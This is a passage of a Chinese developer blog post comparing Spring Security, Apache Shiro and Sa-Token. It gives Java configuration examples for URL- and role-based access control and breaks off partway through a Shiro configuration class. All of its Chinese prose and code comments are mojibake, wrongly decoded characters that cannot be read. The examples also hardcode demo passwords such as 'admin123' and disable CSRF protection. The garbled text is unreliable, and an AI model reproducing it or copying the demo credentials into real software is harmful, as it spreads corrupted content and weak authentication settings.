                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>ä»Šå¤©æˆ‘ä»¬æ¥èŠèŠä¸€ä¸ªè®©å¾ˆå¤šJavaå¼€å‘è€…çº ç»“çš„æŠ€æœ¯é€‰å‹é—®é¢˜ï¼š<strong>Spring Securityã€Apache Shiroå’ŒSa-Tokenï¼Œè¿™3ä¸ªä¸»æµå®‰å…¨æ¡†æ¶åˆ°åº•è¯¥é€‰å“ªä¸ªï¼Ÿ</strong></p>
<p>æœ‰äº›å°ä¼™ä¼´åœ¨å·¥ä½œä¸­å¯èƒ½é‡åˆ°è¿‡è¿™æ ·çš„åœºæ™¯ï¼šæ–°é¡¹ç›®å¯åŠ¨ä¼šä¸Šï¼Œæ¶æ„å¸ˆåšæŒè¦ç”¨Spring Securityï¼Œå›¢é˜Ÿé‡Œçš„è€å°†å´è¯´Shiroæ›´ç®€å•å®ç”¨ï¼Œè€Œå¹´è½»çš„åŒäº‹åˆ™åŠ›èSa-Tokenè¿™ä¸ªåèµ·ä¹‹ç§€ã€‚</p>
<p>å¤§å®¶å„æ‰§ä¸€è¯ï¼Œéƒ½æœ‰é“ç†ï¼Œåˆ°åº•è¯¥å¬è°çš„ï¼Ÿ</p>
<p>ä»Šå¤©è¿™ç¯‡æ–‡ç« å°±è·Ÿå¤§å®¶ä¸€èµ·èŠèŠè¿™ä¸ªè¯é¢˜ï¼Œå¸Œæœ›å¯¹ä½ ä¼šæœ‰æ‰€å¸®åŠ©ã€‚</p>
<p><a href="https://link.juejin.cn/?target=http%3A%2F%2Fsusan.net.cn%2Fproject" title="https://link.juejin.cn/?target=http%3A%2F%2Fsusan.net.cn%2Fproject" target="_blank">æ›´å¤šé¡¹ç›®å®æˆ˜åœ¨æˆ‘çš„æŠ€æœ¯ç½‘ç«™ï¼šwww.susan.net.cn/project</a></p>
<h2 data-id="heading-1">1 æˆ‘ä»¬ä¸ºä»€ä¹ˆéœ€è¦å®‰å…¨æ¡†æ¶ï¼Ÿ</h2>
<p>åœ¨æ·±å…¥å¯¹æ¯”ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆè¦ç†è§£ï¼š<strong>ä¸ºä»€ä¹ˆä¸èƒ½è‡ªå·±æ‰‹å†™å®‰å…¨é€»è¾‘ï¼Œè€Œéè¦ç”¨æ¡†æ¶ï¼Ÿ</strong></p>
<p>æƒ³è±¡ä¸€ä¸‹ï¼Œå¦‚æœä½ è¦ä¸ºä¸€ä¸ªç”µå•†ç³»ç»Ÿå®ç°æƒé™æ§åˆ¶ï¼Œä½ éœ€è¦å¤„ç†ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ‰‹å†™æƒé™æ§åˆ¶çš„å…¸å‹ç—›ç‚¹</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ManualSecurityExample</span> {
    
    <span class="hljs-comment">// 1. æ¯ä¸ªæ–¹æ³•éƒ½è¦å†™é‡å¤çš„æƒé™æ ¡éªŒ</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateProduct</span><span class="hljs-params">(Long productId, ProductDTO dto)</span> {
        <span class="hljs-comment">// æ£€æŸ¥ç”¨æˆ·æ˜¯å¦ç™»å½•</span>
        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> getCurrentUser();
        <span class="hljs-keyword">if</span> (user == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnauthorizedException</span>(<span class="hljs-string">"è¯·å…ˆç™»å½•"</span>);
        }
        
        <span class="hljs-comment">// æ£€æŸ¥ç”¨æˆ·æ˜¯å¦æœ‰ç¼–è¾‘æƒé™</span>
        <span class="hljs-keyword">if</span> (!user.hasPermission(<span class="hljs-string">"product:update"</span>)) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ForbiddenException</span>(<span class="hljs-string">"æ²¡æœ‰æ“ä½œæƒé™"</span>);
        }
        
        <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æ˜¯è‡ªå·±çš„å•†å“ï¼ˆæ•°æ®çº§æƒé™ï¼‰</span>
        <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> productService.getById(productId);
        <span class="hljs-keyword">if</span> (!product.getOwnerId().equals(user.getId())) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ForbiddenException</span>(<span class="hljs-string">"åªèƒ½ä¿®æ”¹è‡ªå·±çš„å•†å“"</span>);
        }
        
        <span class="hljs-comment">// å®é™…ä¸šåŠ¡é€»è¾‘...</span>
        productService.update(productId, dto);
    }
    
    <span class="hljs-comment">// 2. æ¯ä¸ªControlleréƒ½è¦å†™ç™»å½•æ£€æŸ¥</span>
    <span class="hljs-comment">// 3. éœ€è¦è‡ªå·±ç®¡ç†Session/Token</span>
    <span class="hljs-comment">// 4. å¯†ç åŠ å¯†ã€CSRFé˜²æŠ¤éƒ½è¦è‡ªå·±å®ç°</span>
    <span class="hljs-comment">// 5. å®¡è®¡æ—¥å¿—ã€å®‰å…¨äº‹ä»¶å¤„ç†...</span>
}
</code></pre>
<p>çœ‹åˆ°é—®é¢˜äº†å—ï¼Ÿ</p>
<p><strong>å®‰å…¨é€»è¾‘ä¼šåƒâ€œå¹½çµä»£ç â€ä¸€æ ·æ¸—é€åˆ°ä¸šåŠ¡çš„æ¯ä¸ªè§’è½</strong>ï¼Œå¯¼è‡´ï¼š</p>
<ul>
<li>ä»£ç é‡å¤ç‡é«˜</li>
<li>ä¸šåŠ¡é€»è¾‘å’Œå®‰å…¨é€»è¾‘è€¦åˆ</li>
<li>éš¾ä»¥ç»Ÿä¸€ç»´æŠ¤å’Œå‡çº§</li>
<li>å®¹æ˜“é—æ¼å®‰å…¨é˜²æŠ¤ç‚¹</li>
</ul>
<p><strong>å®‰å…¨æ¡†æ¶çš„ä»·å€¼ï¼Œå°±æ˜¯æŠŠè¿™äº›é—®é¢˜æŠ½è±¡åŒ–ã€æ ‡å‡†åŒ–ã€è‡ªåŠ¨åŒ–</strong>ã€‚</p>
<p>ä¸‹é¢è¿™ä¸ªç¤ºæ„å›¾å±•ç¤ºäº†å®‰å…¨æ¡†æ¶å¦‚ä½•å°†å®‰å…¨å…³æ³¨ç‚¹ä»ä¸šåŠ¡ä»£ç ä¸­è§£è€¦å‡ºæ¥ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0366f78d9f5e4a27a5e1e245e7ee8828~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767613200&amp;x-signature=JaKTSsFw7MeIDMpHlJXYEmKV8vI%3D" alt="" loading="lazy"/></p>
<p>ç†è§£äº†å®‰å…¨æ¡†æ¶çš„ä»·å€¼ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬æ·±å…¥åˆ†æè¿™ä¸‰ä¸ªä¸»æµé€‰é¡¹ã€‚</p>
<h2 data-id="heading-2">2 Spring Securityï¼šä¼ä¸šçº§çš„å®‰å…¨â€œç‘å£«å†›åˆ€â€</h2>
<h3 data-id="heading-3">2.1 Spring Securityæ˜¯ä»€ä¹ˆï¼Ÿ</h3>
<p>Spring Securityæ˜¯Springå®˜æ–¹æä¾›çš„å®‰å…¨æ¡†æ¶ï¼Œå¯ä»¥è¯´æ˜¯Springç”Ÿæ€ä¸­çš„â€œå¾¡æ—å†›â€ã€‚</p>
<p>å®ƒä¸ä»…ä»…æ˜¯ä¸€ä¸ªæƒé™æ§åˆ¶æ¡†æ¶ï¼Œæ›´æ˜¯ä¸€ä¸ª<strong>å…¨é¢çš„å®‰å…¨è§£å†³æ–¹æ¡ˆ</strong>ã€‚</p>
<h3 data-id="heading-4">2.2 æ ¸å¿ƒæ¶æ„ï¼šè¿‡æ»¤å™¨é“¾çš„æè‡´è¿ç”¨</h3>
<p>Spring Securityçš„æ ¸å¿ƒæ˜¯<strong>è¿‡æ»¤å™¨é“¾ï¼ˆFilter Chainï¼‰</strong>ã€‚</p>
<p>å½“ä¸€ä¸ªè¯·æ±‚åˆ°è¾¾æ—¶ï¼Œå®ƒä¼šç»è¿‡ä¸€ç³»åˆ—å®‰å…¨è¿‡æ»¤å™¨ï¼Œæ¯ä¸ªè¿‡æ»¤å™¨è´Ÿè´£ç‰¹å®šçš„å®‰å…¨åŠŸèƒ½ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/58db504b58584a86acd2d280558295e2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767613200&amp;x-signature=1oC89Wpf2wMHU%2BLx41FEoKV1l%2BU%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-5">2.3 å¿«é€Ÿæ­å»ºä¸€ä¸ªå®‰å…¨çš„REST API</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 1. åŸºç¡€é…ç½®ç±»</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@EnableWebSecurity</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringSecurityConfig</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">WebSecurityConfigurerAdapter</span> {
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configure</span><span class="hljs-params">(HttpSecurity http)</span> <span class="hljs-keyword">throws</span> Exception {
        http
            <span class="hljs-comment">// ç¦ç”¨CSRFï¼ˆREST APIé€šå¸¸ä¸éœ€è¦ï¼‰</span>
            .csrf().disable()
            
            <span class="hljs-comment">// æˆæƒé…ç½®</span>
            .authorizeRequests()
                .antMatchers(<span class="hljs-string">"/api/public/**"</span>).permitAll()  <span class="hljs-comment">// å…¬å¼€æ¥å£</span>
                .antMatchers(<span class="hljs-string">"/api/admin/**"</span>).hasRole(<span class="hljs-string">"ADMIN"</span>)  <span class="hljs-comment">// éœ€è¦ç®¡ç†å‘˜è§’è‰²</span>
                .antMatchers(<span class="hljs-string">"/api/user/**"</span>).hasAnyRole(<span class="hljs-string">"USER"</span>, <span class="hljs-string">"ADMIN"</span>)  <span class="hljs-comment">// éœ€è¦ç”¨æˆ·è§’è‰²</span>
                .anyRequest().authenticated()  <span class="hljs-comment">// å…¶ä»–æ‰€æœ‰è¯·æ±‚éœ€è¦è®¤è¯</span>
            
            <span class="hljs-comment">// è¡¨å•ç™»å½•é…ç½®ï¼ˆå‰åç«¯åˆ†ç¦»æ—¶é€šå¸¸ç”¨ä¸ä¸Šï¼‰</span>
            .and()
            .formLogin().disable()
            
            <span class="hljs-comment">// åŸºç¡€è®¤è¯é…ç½®</span>
            .httpBasic()
            
            <span class="hljs-comment">// å¼‚å¸¸å¤„ç†</span>
            .and()
            .exceptionHandling()
                .authenticationEntryPoint(restAuthenticationEntryPoint())  <span class="hljs-comment">// æœªè®¤è¯å¤„ç†</span>
                .accessDeniedHandler(restAccessDeniedHandler());  <span class="hljs-comment">// æƒé™ä¸è¶³å¤„ç†</span>
    }
    
    <span class="hljs-comment">// 2. ç”¨æˆ·è¯¦æƒ…æœåŠ¡ï¼ˆä»æ•°æ®åº“åŠ è½½ç”¨æˆ·ï¼‰</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> UserDetailsService <span class="hljs-title function_">userDetailsService</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> username -&gt; {
            <span class="hljs-comment">// è¿™é‡Œå®é™…åº”è¯¥æŸ¥è¯¢æ•°æ®åº“</span>
            <span class="hljs-keyword">if</span> (<span class="hljs-string">"admin"</span>.equals(username)) {
                <span class="hljs-keyword">return</span> User.withUsername(<span class="hljs-string">"admin"</span>)
                    .password(passwordEncoder().encode(<span class="hljs-string">"admin123"</span>))
                    .roles(<span class="hljs-string">"ADMIN"</span>)
                    .build();
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">"user"</span>.equals(username)) {
                <span class="hljs-keyword">return</span> User.withUsername(<span class="hljs-string">"user"</span>)
                    .password(passwordEncoder().encode(<span class="hljs-string">"user123"</span>))
                    .roles(<span class="hljs-string">"USER"</span>)
                    .build();
            }
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UsernameNotFoundException</span>(<span class="hljs-string">"ç”¨æˆ·ä¸å­˜åœ¨: "</span> + username);
        };
    }
    
    <span class="hljs-comment">// 3. å¯†ç ç¼–ç å™¨</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> PasswordEncoder <span class="hljs-title function_">passwordEncoder</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BCryptPasswordEncoder</span>();
    }
    
    <span class="hljs-comment">// 4. REST APIè®¤è¯å…¥å£ç‚¹</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> AuthenticationEntryPoint <span class="hljs-title function_">restAuthenticationEntryPoint</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> (request, response, authException) -&gt; {
            response.setContentType(MediaType.APPLICATION_JSON_VALUE);
            response.setStatus(HttpStatus.UNAUTHORIZED.value());
            response.getWriter().write(
                <span class="hljs-string">"{\"code\": 401, \"message\": \"æœªè®¤è¯ï¼Œè¯·å…ˆç™»å½•\"}"</span>
            );
        };
    }
}

<span class="hljs-comment">// 5. åœ¨Controllerä¸­ä½¿ç”¨å®‰å…¨æ³¨è§£</span>
<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/api")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductController</span> {
    
    <span class="hljs-meta">@GetMapping("/public/products")</span>
    <span class="hljs-keyword">public</span> List&lt;Product&gt; <span class="hljs-title function_">getPublicProducts</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// å…¬å¼€æ¥å£ï¼Œæ— éœ€è®¤è¯</span>
        <span class="hljs-keyword">return</span> productService.getAllProducts();
    }
    
    <span class="hljs-meta">@GetMapping("/user/products")</span>
    <span class="hljs-meta">@PreAuthorize("hasRole('USER')")</span>  <span class="hljs-comment">// éœ€è¦USERè§’è‰²</span>
    <span class="hljs-keyword">public</span> List&lt;Product&gt; <span class="hljs-title function_">getUserProducts</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// è·å–å½“å‰è®¤è¯ç”¨æˆ·</span>
        <span class="hljs-type">Authentication</span> <span class="hljs-variable">auth</span> <span class="hljs-operator">=</span> SecurityContextHolder.getContext().getAuthentication();
        <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> auth.getName();
        
        <span class="hljs-keyword">return</span> productService.getProductsByOwner(username);
    }
    
    <span class="hljs-meta">@PostMapping("/admin/products")</span>
    <span class="hljs-meta">@PreAuthorize("hasRole('ADMIN')")</span>  <span class="hljs-comment">// éœ€è¦ADMINè§’è‰²</span>
    <span class="hljs-keyword">public</span> Product <span class="hljs-title function_">createProduct</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> ProductDTO dto)</span> {
        <span class="hljs-keyword">return</span> productService.createProduct(dto);
    }
    
    <span class="hljs-meta">@DeleteMapping("/admin/products/{id}")</span>
    <span class="hljs-meta">@PreAuthorize("hasPermission(#id, 'product', 'delete')")</span>  <span class="hljs-comment">// æ–¹æ³•çº§æƒé™æ§åˆ¶</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteProduct</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id)</span> {
        productService.deleteProduct(id);
    }
}
</code></pre>
<h3 data-id="heading-6">Spring Securityçš„ä¼˜åŠ¿ä¸ç—›ç‚¹</h3>
<p><strong>ä¼˜åŠ¿ï¼š</strong></p>
<ol>
<li><strong>Springç”Ÿæ€åŸç”Ÿæ”¯æŒ</strong>ï¼šä¸Spring Bootã€Spring Cloudæ— ç¼é›†æˆ</li>
<li><strong>åŠŸèƒ½å…¨é¢</strong>ï¼šè®¤è¯ã€æˆæƒã€é˜²æŠ¤ï¼ˆCSRFã€CORSã€ç‚¹å‡»åŠ«æŒç­‰ï¼‰ä¸€åº”ä¿±å…¨</li>
<li><strong>é«˜åº¦å¯å®šåˆ¶</strong>ï¼šå‡ ä¹æ¯ä¸ªç»„ä»¶éƒ½å¯ä»¥è‡ªå®šä¹‰æˆ–æ›¿æ¢</li>
<li><strong>ç¤¾åŒºå¼ºå¤§</strong>ï¼šSpringå®˜æ–¹ç»´æŠ¤ï¼Œæ–‡æ¡£å®Œå–„ï¼Œç¤¾åŒºæ´»è·ƒ</li>
<li><strong>ä¼ä¸šçº§ç‰¹æ€§</strong>ï¼šOAuth2ã€SAMLã€LDAPç­‰ä¼ä¸šçº§é›†æˆæ”¯æŒ</li>
</ol>
<p><strong>ç—›ç‚¹ï¼š</strong></p>
<ol>
<li><strong>å­¦ä¹ æ›²çº¿é™¡å³­</strong>ï¼šæ¦‚å¿µå¤æ‚ï¼Œé…ç½®ç¹ç</li>
<li><strong>è¿‡åº¦è®¾è®¡æ„Ÿ</strong>ï¼šç®€å•éœ€æ±‚ä¹Ÿéœ€è¦å¤æ‚é…ç½®</li>
<li><strong>è°ƒè¯•å›°éš¾</strong>ï¼šè¿‡æ»¤å™¨é“¾å¤æ‚ï¼Œé—®é¢˜å®šä½å›°éš¾</li>
<li><strong>æ€§èƒ½å¼€é”€</strong>ï¼šå®Œæ•´çš„è¿‡æ»¤å™¨é“¾å¸¦æ¥ä¸€å®šæ€§èƒ½æŸå¤±</li>
</ol>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>å¤§å‹ä¼ä¸šçº§åº”ç”¨</li>
<li>éœ€è¦ä¸Springç”Ÿæ€æ·±åº¦é›†æˆçš„é¡¹ç›®</li>
<li>éœ€è¦OAuth2ã€LDAPç­‰ä¼ä¸šçº§è®¤è¯åè®®çš„é¡¹ç›®</li>
<li>å›¢é˜Ÿæœ‰Spring Securityç»éªŒçš„åœºæ™¯</li>
</ul>
<p>æœ‰äº›å°ä¼™ä¼´åˆšå¼€å§‹å­¦Spring Securityæ—¶ï¼Œå¯èƒ½ä¼šè¢«å®ƒå¤æ‚çš„æ¦‚å¿µææ™•ï¼Œæ¯”å¦‚ï¼š<code>SecurityContext</code>ã€<code>Authentication</code>ã€<code>UserDetails</code>ã€<code>GrantedAuthority</code>ç­‰ç­‰ã€‚</p>
<p>ä½†ä¸€æ—¦æŒæ¡äº†å®ƒçš„è®¾è®¡å“²å­¦ï¼Œä½ ä¼šå‘ç°å®ƒçœŸçš„å¾ˆå¼ºå¤§ã€‚</p>
<h2 data-id="heading-7">3 Apache Shiroï¼šç®€å•ç›´è§‚çš„â€œè½»éª‘å…µâ€</h2>
<h3 data-id="heading-8">3.1 Shiroæ˜¯ä»€ä¹ˆï¼Ÿ</h3>
<p>Apache Shiroæ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§ä¸”æ˜“äºä½¿ç”¨çš„Javaå®‰å…¨æ¡†æ¶ï¼Œå®ƒçš„è®¾è®¡å“²å­¦æ˜¯ï¼š<strong>ç®€åŒ–åº”ç”¨å®‰å…¨ï¼Œè®©å®‰å…¨å˜å¾—æ›´ç®€å•</strong>ã€‚</p>
<p>å¦‚æœè¯´Spring Securityæ˜¯é‡å‹å¦å…‹ï¼Œé‚£ä¹ˆShiroå°±æ˜¯çµæ´»æœºåŠ¨çš„è½»éª‘å…µã€‚</p>
<h3 data-id="heading-9">3.2 æ ¸å¿ƒæ¶æ„ï¼šå››å¤§æ ¸å¿ƒæ¦‚å¿µ</h3>
<p>Shiroçš„æ¶æ„å›´ç»•å››ä¸ªæ ¸å¿ƒæ¦‚å¿µæ„å»ºï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c09f44fd817149d59381c390cbde4d5b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767613200&amp;x-signature=s8iIMYEWyFWNIkM7mUBx4U4h%2Fto%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-10">3.3 å¿«é€Ÿå®ç°åŸºäºURLçš„æƒé™æ§åˆ¶</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 1. Shiroé…ç½®ç±»</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ShiroConfig</span> {
    
    <span class="hljs-comment">// åˆ›å»ºShiroFilterFactoryBean</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> ShiroFilterFactoryBean <span class="hljs-title function_">shiroFilterFactoryBean</span><span class="hljs-params">(
            SecurityManager securityManager)</span> {
        <span class="hljs-type">ShiroFilterFactoryBean</span> <span class="hljs-variable">factoryBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ShiroFilterFactoryBean</span>();
        factoryBean.setSecurityManager(securityManager);
        
        <span class="hljs-comment">// è®¾ç½®ç™»å½•é¡µé¢</span>
        factoryBean.setLoginUrl(<span class="hljs-string">"/login"</span>);
        <span class="hljs-comment">// è®¾ç½®æœªæˆæƒé¡µé¢</span>
        factoryBean.setUnauthorizedUrl(<span class="hljs-string">"/unauthorized"</span>);
        
        <span class="hljs-comment">// é…ç½®æ‹¦æˆªè§„åˆ™</span>
        Map&lt;String, String&gt; filterChainDefinitionMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>&lt;&gt;();
        
        <span class="hljs-comment">// é™æ€èµ„æºæ”¾è¡Œ</span>
        filterChainDefinitionMap.put(<span class="hljs-string">"/static/**"</span>, <span class="hljs-string">"anon"</span>);
        filterChainDefinitionMap.put(<span class="hljs-string">"/css/**"</span>, <span class="hljs-string">"anon"</span>);
        filterChainDefinitionMap.put(<span class="hljs-string">"/js/**"</span>, <span class="hljs-string">"anon"</span>);
        
        <span class="hljs-comment">// å…¬å¼€æ¥å£</span>
        filterChainDefinitionMap.put(<span class="hljs-string">"/api/public/**"</span>, <span class="hljs-string">"anon"</span>);
        filterChainDefinitionMap.put(<span class="hljs-string">"/login"</span>, <span class="hljs-string">"anon"</span>);
        
        <span class="hljs-comment">// éœ€è¦è®¤è¯çš„æ¥å£</span>
        filterChainDefinitionMap.put(<span class="hljs-string">"/api/user/**"</span>, <span class="hljs-string">"authc"</span>);
        filterChainDefinitionMap.put(<span class="hljs-string">"/api/admin/**"</span>, <span class="hljs-string">"authc, roles[admin]"</span>);
        
        <span class="hljs-comment">// éœ€è¦ç‰¹å®šæƒé™çš„æ¥å£</span>
        filterChainDefinitionMap.put(<span class="hljs-string">"/api/products/create"</span>, <span class="hljs-string">"authc, perms[product:create]"</span>);
        filterChainDefinitionMap.put(<span class="hljs-string">"/api/products/delete/*"</span>, <span class="hljs-string">"authc, perms[product:delete]"</span>);
        
        <span class="hljs-comment">// å…¶ä»–æ‰€æœ‰è¯·æ±‚éœ€è¦è®¤è¯</span>
        filterChainDefinitionMap.put(<span class="hljs-string">"/**"</span>, <span class="hljs-string">"authc"</span>);
        
        factoryBean.setFilterChainDefinitionMap(filterChainDefinitionMap);
        <span class="hljs-keyword">return</span> factoryBean;
    }
    
    <span class="hljs-comment">// åˆ›å»ºSecurityManager</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> SecurityManager <span class="hljs-title function_">securityManager</span><span class="hljs-params">()</span> {
        <span class="hljs-type">DefaultWebSecurityManager</span> <span class="hljs-variable">securityManager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultWebSecurityManager</span>();
        
        <span class="hljs-comment">// è®¾ç½®Realm</span>
        securityManager.setRealm(customRealm());
        
        <span class="hljs-comment">// è®¾ç½®Sessionç®¡ç†å™¨</span>
        securityManager.setSessionManager(sessionManager());
        
        <span class="hljs-comment">// è®¾ç½®ç¼“å­˜ç®¡ç†å™¨</span>
        securityManager.setCacheManager(cacheManager());
        
        <span class="hljs-keyword">return</span> securityManager;
    }
    
    <span class="hljs-comment">// è‡ªå®šä¹‰Realmï¼ˆè¿æ¥å®‰å…¨æ•°æ®æºï¼‰</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> Realm <span class="hljs-title function_">customRealm</span><span class="hljs-params">()</span> {
        <span class="hljs-type">CustomRealm</span> <span class="hljs-variable">realm</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomRealm</span>();
        
        <span class="hljs-comment">// è®¾ç½®å¯†ç åŒ¹é…å™¨</span>
        <span class="hljs-type">HashedCredentialsMatcher</span> <span class="hljs-variable">credentialsMatcher</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashedCredentialsMatcher</span>();
        credentialsMatcher.setHashAlgorithmName(<span class="hljs-string">"SHA-256"</span>);
        credentialsMatcher.setHashIterations(<span class="hljs-number">1024</span>);
        credentialsMatcher.setStoredCredentialsHexEncoded(<span class="hljs-literal">false</span>);
        realm.setCredentialsMatcher(credentialsMatcher);
        
        <span class="hljs-comment">// å¼€å¯ç¼“å­˜</span>
